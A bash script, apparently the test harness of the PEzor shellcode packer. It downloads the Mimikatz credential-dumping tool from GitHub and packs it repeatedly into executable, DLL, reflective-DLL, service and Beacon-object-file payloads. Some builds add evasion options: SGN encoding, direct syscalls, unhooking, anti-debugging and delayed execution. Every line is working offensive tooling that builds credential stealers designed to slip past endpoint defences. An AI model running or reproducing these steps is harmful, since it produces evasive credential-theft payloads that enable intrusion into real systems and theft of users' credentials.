#!/usr/bin/env bash

INSTALL_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

$INSTALL_DIR/install.sh --llvm &&

export PATH=$PATH:~/go/bin/:$INSTALL_DIR:$INSTALL_DIR/deps/donut/:$INSTALL_DIR/deps/wclang/_prefix_PEzor_/bin/ &&

wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200519/mimikatz_trunk.zip &&

unzip -d mimikatz mimikatz_trunk.zip &&

bash -c "$INSTALL_DIR/PEzor.sh -64 mimikatz/x64/mimikatz.exe -z 2" &&
bash -c "$INSTALL_DIR/PEzor.sh -64 -format=dll mimikatz/x64/mimikatz.exe -z 2" &&
bash -c "$INSTALL_DIR/PEzor.sh -64 -format=reflective-dll mimikatz/x64/mimikatz.exe -z 2" &&
bash -c "$INSTALL_DIR/PEzor.sh -64 -format=service-exe mimikatz/x64/mimikatz.exe -z 2" &&
bash -c "$INSTALL_DIR/PEzor.sh -64 -format=service-dll mimikatz/x64/mimikatz.exe -z 2" &&
bash -c "$INSTALL_DIR/PEzor.sh -64 -format=bof mimikatz/x64/mimikatz.exe -z 2" &&
bash -c "$INSTALL_DIR/PEzor.sh -64 -sgn mimikatz/x64/mimikatz.exe -z 2" &&
bash -c "$INSTALL_DIR/PEzor.sh -64 -sgn -syscalls mimikatz/x64/mimikatz.exe -z 2" &&
bash -c "$INSTALL_DIR/PEzor.sh -64 -sgn -syscalls -unhook mimikatz/x64/mimikatz.exe -z 2" &&
bash -c "$INSTALL_DIR/PEzor.sh -64 -sgn -syscalls -unhook -debug mimikatz/x64/mimikatz.exe -z 2" &&
bash -c "$INSTALL_DIR/PEzor.sh -64 -sgn -syscalls -unhook -debug -sleep=120 mimikatz/x64/mimikatz.exe -z 2" &&
bash -c "$INSTALL_DIR/PEzor.sh -64 -sgn -syscalls -unhook -antidebug -sleep=120 mimikatz/x64/mimikatz.exe -z 2" &&
echo '[!] All tests done!'
